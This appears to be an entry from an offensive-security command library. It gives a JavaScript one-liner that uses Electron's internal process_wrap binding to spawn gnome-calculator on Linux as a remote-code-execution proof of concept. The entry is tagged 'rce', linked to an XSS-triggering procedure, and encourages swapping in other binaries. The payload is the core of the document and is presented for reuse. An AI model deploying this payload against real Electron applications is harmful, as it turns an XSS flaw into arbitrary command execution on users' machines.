---
id: cmd-spawn-linux
data: >-
  var Process = process.binding('process_wrap').Process; var proc = new
  Process(); proc.onexit = function(a,b) {}; var env = process.env; var env_ =
  []; for (var key in env) env_.push(key+'='+env[key]);
  proc.spawn({file:'/usr/bin/gnome-calculator',cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});
tags:
  - rce
  - process-spawn
type: command
output: null
executor: javascript
platforms:
  - Linux
  - Electron
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:23:36.266Z'
verified: false
validated: true
submitted: true
---
# Spawn Process via Electron Process API (Linux)

## Command

```javascript
var Process = process.binding('process_wrap').Process; var proc = new Process(); proc.onexit = function(a,b) {}; var env = process.env; var env_ = []; for (var key in env) env_.push(key+'='+env[key]); proc.spawn({file:'/usr/bin/gnome-calculator',cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});
```

## Description

This JavaScript command spawns gnome-calculator on Linux using Electron's Process API, suitable for demonstrating RCE in Ubuntu/Linux environments.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| file | Executable path (/usr/bin/gnome-calculator) | Yes |
| cwd | Working directory (null) | No |
| windowsVerbatimArguments | Boolean (false) | No |
| detached | Spawn detached (false) | No |
| envPairs | Environment variables array | Yes |
| stdio | I/O configuration (ignore all) | Yes |

## Examples

### Basic Usage

Use the command as-is in the external JS file.

### Advanced Usage

Adapt file and args for other Linux binaries, e.g., {file: '/bin/ls', args: []}.

## Expected Output

Launches gnome-calculator on Ubuntu/Linux.

## Related

- [[commands/spawn-process-via-electron-process-api-windows]]
- [[procedures/Trigger-XSS-by-Previewing-Note]]
